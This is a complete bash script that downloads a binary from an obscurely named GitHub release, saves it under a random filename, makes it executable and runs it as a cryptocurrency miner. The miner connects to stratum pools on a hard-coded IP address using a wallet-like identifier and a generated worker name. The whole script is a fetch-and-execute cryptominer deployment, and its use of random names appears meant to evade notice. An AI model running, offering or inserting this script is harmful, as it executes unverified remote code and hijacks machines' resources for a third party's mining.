#!/bin/bash

# Generate a random 10-character lowercase alphanumeric filename
generate_random_filename() {
    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
    echo
}

generate_worker_name() {
    local prefix="JNKT99"
    local date_str
    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
    local random_suffix
    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)

    echo "${prefix}-${date_str}-${random_suffix}"
}


main() {
    miner_filename=$(generate_random_filename)
    worker_name=$(generate_worker_name)

    # Optional: cleanup on Ctrl+C or SIGTERM
    trap "echo 'ðŸ§¹ Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM

    echo "ðŸ“¥ Downloading miner to: $miner_filename"
    if wget -q https://github.com/vedhagsvp/tkospae/releases/download/bxbse/msavsp -O "$miner_filename"; then
        echo "âœ… Miner downloaded as: $miner_filename"
    else
        echo "âŒ Failed to download miner. Exiting."
        exit 1
    fi

    echo "ðŸ” Setting executable permission..."
    if chmod +x "$miner_filename"; then
        echo "âœ… Permissions set."
    else
        echo "âŒ Failed to set permissions. Exiting."
        exit 1
    fi

    echo "ðŸ‘· Worker Name: $worker_name"

    echo "ðŸš€ Starting miner..."
    ./"$miner_filename" \
        -P stratum1+tcp://cb82f561e5065c48c5867cb42c1a0f927efa395002d0.${worker_name}@44.242.175.87:8080 \
        -P stratum1+tcp://cb82f561e5065c48c5867cb42c1a0f927efa395002d0.${worker_name}@44.242.175.87:8081 \
        -P stratum1+tcp://cb82f561e5065c48c5867cb42c1a0f927efa395002d0.${worker_name}@44.242.175.87:8082

    if [[ $? -eq 0 ]]; then
        echo "âœ… Miner ran successfully."
    else
        echo "âŒ Miner exited with an error."
    fi
}

main
